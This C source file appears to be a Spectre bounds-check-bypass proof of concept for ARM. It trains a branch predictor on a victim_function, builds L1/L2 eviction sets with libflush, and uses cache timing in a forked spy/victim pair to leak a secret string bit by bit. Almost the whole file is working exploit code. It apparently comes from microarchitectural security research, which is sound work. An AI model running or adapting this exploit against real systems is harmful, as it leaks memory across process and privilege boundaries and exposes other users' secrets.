

#define _GNU_SOURCE
#include <asm/unistd.h>
#include <assert.h>
#include <libflush.h>
#include <linux/perf_event.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>




#ifndef CHASE
#define CHASE ".rept 4\n"
#endif

#define PAGESIZE 4096

#ifndef L1_ASSOC
#define L1_ASSOC 4
#endif

#ifndef LINE_SIZE
#define LINE_SIZE 32
#endif

#ifndef L1_SET
#define L1_SET 256
#endif

#ifndef L2_SET
#define L2_SET 2048
#endif

#ifndef L2_ASSOC
#define L2_ASSOC 8
#endif




#define TIMING_LIBFLUSH
libflush_session_t* libflush_session;


#define KB (1024)
#define MB (1024 * KB)
#define BUFFER_SIZE (32 * MB)
#define ENTRY_SIZE (8)
#define CACHE_LINE (32)

#define PROTECTION (PROT_EXEC | PROT_READ | PROT_WRITE)
#define PROTECTION2 (PROT_READ | PROT_WRITE)
#define FLAGS (MAP_PRIVATE | MAP_ANONYMOUS)
#define PROBE_OFFSET (2048)


typedef void *vaddr;
typedef void *paddr;


volatile unsigned int* syncer;

char* buffer;


int MAX_TRIES = 999;
unsigned int CACHE_HIT_THRESHOLD = 100;

/********************************************************************
Victim code.
********************************************************************/

uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};

//uint8_t unused2[32*9] = {1};
uint8_t unused2[64];
uint8_t* array2; // [256 * PROBE_OFFSET];
unsigned int array1_size = 16;

unsigned int *array1_size_ptr;

int** array1_size_mm;
uint8_t unused3[32*6] = {1};

char* secret = "\x01\x01\x00\x00\x00\x00\x01\x00  The Magic Words are Squeamish Ossifrage.";
uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */
uint32_t temp2 = 0;

static inline uint64_t read_cycles(void){
	uint32_t r = 0;
	asm volatile("mrc p15, 0, %0, c9, c13, 0" : "=r"(r) );
	return r;
}


static inline write_pmselr_counter(void){
	asm volatile("mcr p15, 0, %0, c9, c12, 1" :: "r"(0x8000000f));
}

static inline uint64_t read_pmselr_counter(void){
	uint32_t r = 0;
	asm volatile("mrc p15, 0, %0, c9, c12, 5" : "=r"(r) );
	return r;
}


static inline uint64_t read_perf_counter(void){
	uint32_t r = 0;
	asm volatile("mrc p15, 0, %0, c9, c12, 1" : "=r"(r) );
	return r;
}



static inline void barriers(void){
	__asm__ __volatile__ ("dsb sy"  : : : "memory");
}

static inline __attribute__((optimize("-O1"))) uint64_t get_time(void){
	uint64_t timer;

	barriers();
	timer = read_cycles();
	barriers();

	return timer;
}


static inline void memaccess(vaddr addr)
{
  volatile uint32_t value;
  asm volatile ("LDR %0, [%1]\n\t"
      : "=r" (value)
      : "r" (addr)
      );
}


static void __attribute__((optimize("-O1"))) victim_function(size_t x)
{
	if (x < *array1_size_ptr)
	{
		temp += array2[array1[x] * PROBE_OFFSET];
	}
	temp += 3;
}



int get_L1_cache_set(vaddr addr){
	paddr p_addr = libflush_get_physical_address(libflush_session, addr);
	return ((int)p_addr >> 5) & 0xff;
}

int get_L2_cache_set(vaddr addr){
	paddr p_addr = libflush_get_physical_address(libflush_session, addr);
	return ((int)p_addr >> 5) & 0x7ff;
}


static void * allocate_aligned(size_t size, size_t alignment)
{

	const size_t mask = alignment - 1;
	const uintptr_t mem = (uintptr_t) malloc(size + alignment);
	return (void *) ((mem + mask) & ~mask);

}


static void _swap(void** a, void** b)
{
  void* tmp = *a;
  *a = *b;
  *b = tmp;
}

static void _shuffle(void**arr, size_t n)
{
  int i, j;
  for(i = n - 1; i > 0; i--) {
    j = rand() % (i+1);
    _swap(arr+i, arr+j);
  }
}

static inline void _chase(char** b)
{
  asm volatile(
    "LDR r5, [%0] \n\t"
    ".rept 100\n\t"
    "LDR r5, [r5]\n\t"
    ".endr\n"
    :: "r" (b)
	: "cc", "r5"
  );
}


static inline void _chase_L2(char** b)
{
	_chase(b);
	_chase(b+1);
	_chase(b);
	_chase(b+1);


}

static inline uint32_t _chase_time(char** b)
{
  uint64_t t1 = get_time();
  asm volatile(
    "LDR r5, [%0] \n\t"
    ".rept 3\n\t"
    "LDR r5, [r5]\n\t"
    ".endr\n"
    :: "r" (b)
	: "cc", "r5"
  );
  return get_time() - t1;
}

static inline uint32_t _chase_time_L2(char** b)
{
  uint64_t t1 = get_time();
  asm volatile(
    "LDR r5, [%0] \n\t"
    ".rept 8\n\t"
    "LDR r5, [r5]\n\t"
    ".endr\n"
    :: "r" (b)
	: "cc", "r5"
  );
  return get_time() - t1;
}



static void _print_pointer_chaser(char** b, size_t n)
{
  int i;
  _chase(b);
  b = *(b + 1);
  _chase(b);
}


static char** pointer_chasing(char**arr, size_t n)
{
  int i;
  // forward pointer
  for (i = 1; i < n; i++){
    *(char**)(*(arr+i-1)) = *(arr+i);
  }
  *(char**)(*(arr+i-1)) = *arr;

  // backward pointer
  for (i = n - 2; i >= 0; i--){
    *((char**)*(arr+i+1) + 1) = (char**)*(arr+i) + 1;
  }
  *((char**)*(arr+i+1) + 1) = (char**)*(arr+n-1) + 1;

  return (char**)*arr;
}



static char** create_et(void* p, size_t n, int target_set_idx)
{
  char** et = malloc(sizeof(void*)*n);

  int i;
  for(i = 0; i < n; i++){
    *(et+i) = p + target_set_idx * LINE_SIZE + (i*L1_SET*LINE_SIZE);
  }

  _shuffle((void**)et, n);

  char** r = pointer_chasing(et, n);
  free(et);
  return r;
}


static char** create_et_L2(void* p, size_t n, int target_set_idx)
{
  char** et = malloc(sizeof(void*)*n);

  int i;
  for(i = 0; i < n; i++){
    *(et+i) = p + target_set_idx * LINE_SIZE + (i*L2_SET*LINE_SIZE);
    printf("Set Index: %d\n", get_L2_cache_set(*(et+i)));
  }

  _shuffle((void**)et, n);

  char** r = pointer_chasing(et, n);
  free(et);
  return r;
}


static char* _victim(void* p, int target_set_idx)
{
  return p + target_set_idx * LINE_SIZE + (70*L1_SET*LINE_SIZE);
}


void print_hist(int* hist, int total, const char* title){

	for(int i = 0; i < total; i++)
		printf("%s %i\n", title, hist[i]);
}



void notify_victim() {
    *syncer = 1;
    barriers();
    sched_yield();

}

void wait_victim() {
    while (*syncer != 0){
    	sched_yield();
    }
}

void notify_spy() {
    *syncer = 0;
    //barriers();
    sched_yield();

}

void wait_spy() {
    while (*syncer != 1){
    	sched_yield();
    }
}


static inline size_t clean_GHB(size_t malicious_x){
	  asm volatile(
		"cmp %0, #100\n\t"
		".rept 50000\n\t"
		"bxls lr\n\t"
	    "add %0, %0, #1\n\t"
		".endr\n\t"
		:: "r" (malicious_x)
		: "cc", "r5"
	  );
	  return malicious_x;
}


static inline void reconstruct_GHR(){
	  int a;
	  volatile int b = 20000;
	  for(int i = 0, a = 0; i< 50; i++){
		if(a < b)
			a++;
	  }
	  barriers();
}


int hist_0[1000];
int hist_1[1000];
int bit_no = 0;
int bits[8];
/* Report best guess in value[0] and runner-up in value[1] */
void __attribute__((optimize("-O1"))) readMemoryByte(uint8_t value[2], int score[2], char** r_0, char** r_1,  char** r_branch) //__attribute__((optimize("-O2")))
{
	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
	static int results[256];
	volatile int tries, i, j, k, z, low, high = 10000;
	unsigned int junk = 0;
	size_t training_x, x;
	register uint64_t timer1, timer2;
	volatile char t;
	int index_hist = 0;

	for (i = 0; i < 256; i++){
		results[i] = 0;
	}

	for (tries = MAX_TRIES; tries > 0; tries--)
	{

		_chase_L2(r_0);
		barriers();
		training_x = tries % array1_size; //  array1_size

		for (j = 9; j >= 1; j--)
		{
			_chase_L2(r_branch);
			barriers();

			x = ((j % 10) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%9==0, else x=0 */
			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x));

			victim_function(x);
		}



		_chase_L2(r_branch);
		barriers();
		for (volatile int z = 0; z < 1000; z++){} // soft barrier
		_chase_L2(r_0);
		barriers();
		for (volatile int z = 0; z < 1000; z++){} // soft barrier


		notify_victim(syncer);
		// Victim is running here
		wait_victim(syncer);


		/*Timing of the bit value*/
		timer1 = get_time();
		memaccess(&array2[0 * PROBE_OFFSET]);
		timer2 = get_time();
		hist_0[index_hist] = timer2 - timer1;

		index_hist++;

	}

	/*Evaluation of the bit value*/
	barriers();
	for(int tries = 0; tries < MAX_TRIES; tries++ ){
		if(hist_0[tries] < 80){
			bits[bit_no]++;
		}
	}

	bit_no++;


}


void setcpuaffinity(int cpu) {
    cpu_set_t cs;
    CPU_ZERO(&cs);
    CPU_SET(cpu, &cs);
    if (sched_setaffinity(0, sizeof(cs), &cs) < 0) {
        perror("migrate");
        exit(1);
    }
}


void victim_process(int cpu){

	setcpuaffinity(cpu);

	if (libflush_init(&libflush_session, NULL) == false) {
	  printf("Error: Could not initialize libflush\n");
	  return -1;
	}

	paddr p_ofarray2 = libflush_get_physical_address(libflush_session, &array2[0 * PROBE_OFFSET]);
	paddr p_of_array1_size= libflush_get_physical_address(libflush_session, array1_size_ptr);


	printf("%p\n", p_ofarray2);
	printf("%p\n------------\n", p_of_array1_size);


	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */

	int repeat = 8*999;

	while(repeat--){

		wait_spy(syncer);
		victim_function(malicious_x);
		notify_spy(syncer);


		if(repeat % 999 == 0){
			malicious_x++;
		}
	}

	if (libflush_terminate(libflush_session) == false) {
	  printf("Libflush terminate failed\n");
	  return -1;
	}

	exit(0);
}

void spy_process(int cpu){

	setcpuaffinity(cpu);

	int score[2];
	int len = 8;
	uint8_t value[2];



	if (libflush_init(&libflush_session, NULL) == false) {
	  printf("Error: Could not initialize libflush\n");
	  return -1;
	}


	paddr p_ofarray2 = libflush_get_physical_address(libflush_session, &array2[0 * PROBE_OFFSET]);
	paddr p_of_array1_size= libflush_get_physical_address(libflush_session, array1_size_ptr);



	printf("MAX_TRIES=%d CACHE_HIT_THRESHOLD=%d len=%d\n", MAX_TRIES, CACHE_HIT_THRESHOLD, len);




	size_t sz = 256 * PAGESIZE;
	void *p = allocate_aligned(sz, PAGESIZE);
	memset(p, 0, sz);
	int p_L2_set = get_L2_cache_set(p);


	while(p_L2_set != 0){
		p += PAGESIZE;
		p_L2_set = get_L2_cache_set(p);
	}


	/* Get the set indexes*/
	int set_idx_0 = get_L2_cache_set(&array2[0 * PROBE_OFFSET]);
	int set_idx_1 = get_L1_cache_set(&array2[1 * PROBE_OFFSET]);

//	 int set_array1_size = get_L2_cache_set(&array1_size);
	int set_array1_size = get_L2_cache_set(array1_size_ptr);

	/* Get the chaser pointers*/
	char** r_0 = create_et_L2(p, 8, set_idx_0);
	printf("\n");
	char** r_1 = create_et(p, L1_ASSOC, set_idx_1);
	printf("\n");
	char** r_branch = create_et_L2(p, 8, set_array1_size);



	printf("\nReading %d bytes:\n", len);
	while (--len >= 0) {
//		printf("Reading at malicious_x = %p... ", (void*) malicious_x);
		readMemoryByte(value, score, r_0, r_1, r_branch);
		printf("Bit %d %s: %d", (7-len) , (score[0] >= 2 * score[1] ? "Success" : "Unclear"), (bits[(7-len)] > 80 ? 0 : 1));
		if (score[1] > 0)
			printf("(second best: 0x%02X score=%d)", value[1], score[1]);
		printf("\n");
	}

	if (libflush_terminate(libflush_session) == false) {
	  printf("Libflush terminate failed\n");
	  return -1;
	}

}


int main(int argc, char **argv)
{

    /*Shared Memeories*/
    syncer = mmap(NULL, sizeof(*syncer), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    array2 = mmap(NULL, 256*PROBE_OFFSET, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    array1_size_ptr = mmap(NULL, sizeof(*array1_size_ptr), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

    *array1_size_ptr = 16;

	for (size_t i = 0; i <  (256 * PROBE_OFFSET); i+= PROBE_OFFSET)
		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */

	pid_t pid = fork();
	if(pid == 0){
		victim_process(1);
	}
	else
	{
		spy_process(1);
	}

	printf("\n--DONE--\n");
	return (0);

}




